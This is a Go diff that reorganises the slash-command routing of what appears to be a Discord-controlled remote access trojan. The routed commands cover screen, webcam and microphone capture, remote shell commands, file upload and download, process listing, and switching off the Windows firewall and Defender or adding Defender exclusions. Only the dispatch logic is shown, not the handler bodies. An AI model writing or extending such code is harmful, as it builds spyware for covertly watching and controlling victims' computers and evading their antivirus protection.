@@ -63,39 +63,91 @@ func handleSlashCommand(s *discordgo.Session, i *discordgo.InteractionCreate, da
 		handleSlashHelp(s, i)
 	case "cmd":
 		handleSlashCmd(s, i, data)
+	case GroupMedia:
+		handleMediaGroup(s, i, data)
+	case GroupFS:
+		handleFSGroup(s, i, data)
+	case GroupSys:
+		handleSysGroup(s, i, data)
+	case GroupWin:
+		handleWinGroup(s, i, data)
+	case GroupDev:
+		handleDevGroup(s, i, data)
+	}
+}
+
+// subData unwraps the subcommand option Discord sends for grouped commands.
+func subData(data discordgo.ApplicationCommandInteractionData) (string, discordgo.ApplicationCommandInteractionData) {
+	if len(data.Options) == 0 {
+		return "", discordgo.ApplicationCommandInteractionData{}
+	}
+	o := data.Options[0]
+	return o.Name, discordgo.ApplicationCommandInteractionData{
+		Name:     o.Name,
+		Options:  o.Options,
+		Resolved: data.Resolved,
+	}
+}
+
+func handleMediaGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
+	name, sub := subData(data)
+	switch name {
 	case "screenshot":
 		handleSlashScreenshot(s, i)
 	case "camera":
 		handleSlashCamera(s, i)
 	case "mic":
-		handleSlashMic(s, i, data)
+		handleSlashMic(s, i, sub)
 	case "record":
-		handleSlashRecord(s, i, data)
+		handleSlashRecord(s, i, sub)
 	case "recordstop":
 		handleSlashRecordStop(s, i)
-	case "log":
-		handleSlashLog(s, i, data)
+	}
+}
+
+func handleFSGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
+	name, sub := subData(data)
+	switch name {
 	case "cwd":
 		handleSlashCwd(s, i)
 	case "ls":
-		handleSlashLs(s, i, data)
+		handleSlashLs(s, i, sub)
+	case "download":
+		handleSlashDownload(s, i, sub)
+	case "upload":
+		handleSlashUpload(s, i, sub)
+	}
+}
+
+func handleSysGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
+	name, sub := subData(data)
+	switch name {
 	case "ps":
 		handleSlashPs(s, i)
 	case "pidinfo":
-		handleSlashPidInfo(s, i, data)
-	case "winsec":
+		handleSlashPidInfo(s, i, sub)
+	case "log":
+		handleSlashLog(s, i, sub)
+	}
+}
+
+func handleWinGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
+	name, sub := subData(data)
+	switch name {
+	case "sec":
 		handleSlashWinSec(s, i)
-	case "winfirewall":
-		handleSlashWinFirewall(s, i, data)
-	case "windefender":
-		handleSlashWinDefender(s, i, data)
-	case "windefenderexclude":
-		handleSlashWinDefenderExclude(s, i, data)
-	case "download":
-		handleSlashDownload(s, i, data)
-	case "upload":
-		handleSlashUpload(s, i, data)
-	case "restart":
+	case "firewall":
+		handleSlashWinFirewall(s, i, sub)
+	case "defender":
+		handleSlashWinDefender(s, i, sub)
+	case "exclude":
+		handleSlashWinDefenderExclude(s, i, sub)
+	}
+}
+
+func handleDevGroup(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
+	name, _ := subData(data)
+	if name == "restart" {
 		handleSlashRestart(s, i)
 	}
 }
